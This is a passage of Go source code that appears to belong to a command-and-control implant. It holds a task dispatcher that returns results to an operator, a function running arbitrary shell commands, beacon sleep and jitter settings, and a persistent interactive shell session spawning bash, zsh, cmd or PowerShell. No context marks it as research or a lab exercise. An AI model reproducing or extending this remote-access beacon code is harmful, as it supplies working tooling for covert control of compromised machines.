		if err != nil {
			errStr = err.Error()
		}
		t.sendResult(task.ID, out, errStr)

	default:
		t.sendResult(task.ID, "", "unknown task type: "+task.Type)
	}
}

func runShell(cmd string) (string, error) {
	c := makeShellCmd(cmd)
	var out bytes.Buffer
	c.Stdout = &out
	c.Stderr = &out
	if err := c.Start(); err != nil {
		return "", err
	}
	done := make(chan error, 1)
	go func() { done <- c.Wait() }()
	select {
	case err := <-done:
		return out.String(), err
	case <-time.After(60 * time.Second):
		c.Process.Kill()
		return out.String(), fmt.Errorf("command timed out after 60s")
	}
}

// updateSleep is set by beacon.go at startup
var updateSleep func(sec, jitter int)

func parseSleepConfig() (int, int) {
	sec, err := strconv.Atoi(SleepSec)
	if err != nil {
		sec = 60
	}
	jitter, err := strconv.Atoi(JitterPct)
	if err != nil {
		jitter = 20
	}
	return sec, jitter
}

// ── Interactive shell ─────────────────────────────────────────────────────

type ishellSession struct {
	cmd   *exec.Cmd
	stdin io.WriteCloser
	outCh chan string
}

var (
	ishellMu   sync.Mutex
	ishellProc *ishellSession
)

const ishellEOC = "__SHLEOF__"

func ishellOpen(shell string) error {
	ishellMu.Lock()
	defer ishellMu.Unlock()

	if ishellProc != nil {
		_ = ishellProc.stdin.Close()
		_ = ishellProc.cmd.Process.Kill()
		_ = ishellProc.cmd.Wait()
		ishellProc = nil
	}

	var cmd *exec.Cmd
	if runtime.GOOS == "windows" {
		if shell == "ps" || shell == "powershell" {
			cmd = exec.Command("powershell.exe", "-NoLogo", "-NoProfile", "-NonInteractive")
		} else {
			cmd = exec.Command("cmd.exe", "/Q")
		}
	} else {
		if shell == "zsh" {
			cmd = exec.Command("zsh", "--norc")
		} else {
			cmd = exec.Command("/bin/bash", "--norc", "--noprofile")
		}
	}

	stdin, err := cmd.StdinPipe()
	if err != nil {
		return err
	}
	stdout, err := cmd.StdoutPipe()
	if err != nil {
		_ = stdin.Close()
		return err
	}
	stderr, err := cmd.StderrPipe()
	if err != nil {
		_ = stdin.Close()
		return err
	}
	if err := cmd.Start(); err != nil {
		_ = stdin.Close()
		return err
	}

	merged := make(chan string, 4096)
	var wg sync.WaitGroup
	wg.Add(2)
	scanInto := func(r io.Reader) {
		defer wg.Done()
		sc := bufio.NewScanner(r)
		for sc.Scan() {
			merged <- sc.Text()
		}
	}
	go scanInto(stdout)
	go scanInto(stderr)
	go func() {
		wg.Wait()
		close(merged)
	}()

	ishellProc = &ishellSession{cmd: cmd, stdin: stdin, outCh: merged}
	return nil
}

func ishellRun(cmdLine string) (string, error) {
	ishellMu.Lock()
	sess := ishellProc
	ishellMu.Unlock()

	if sess == nil {
		return "", fmt.Errorf("no active shell — use 'ishell open' first")
	}

	marker := fmt.Sprintf("%s_%d", ishellEOC, time.Now().UnixNano())
	var echoLine string
	if runtime.GOOS == "windows" {
		echoLine = "echo " + marker
	} else {
		echoLine = "echo " + marker
	}
	if _, err := fmt.Fprintf(sess.stdin, "%s\n%s\n", cmdLine, echoLine); err != nil {
		return "", err
	}

	var lines []string
	timeout := time.After(30 * time.Second)
	for {
		select {
		case line, ok := <-sess.outCh:
			if !ok {
				return strings.Join(lines, "\n"), fmt.Errorf("shell process exited")
			}
			if strings.Contains(line, marker) {
				return strings.Join(lines, "\n"), nil
			}
			lines = append(lines, line)
		case <-timeout:
			return strings.Join(lines, "\n"), fmt.Errorf("timeout waiting for shell output")
		}
	}
}

func ishellClose() {
	ishellMu.Lock()
	defer ishellMu.Unlock()

	if ishellProc != nil {
		_ = ishellProc.stdin.Close()
		_ = ishellProc.cmd.Process.Kill()
		_ = ishellProc.cmd.Wait()
		ishellProc = nil
	}
}
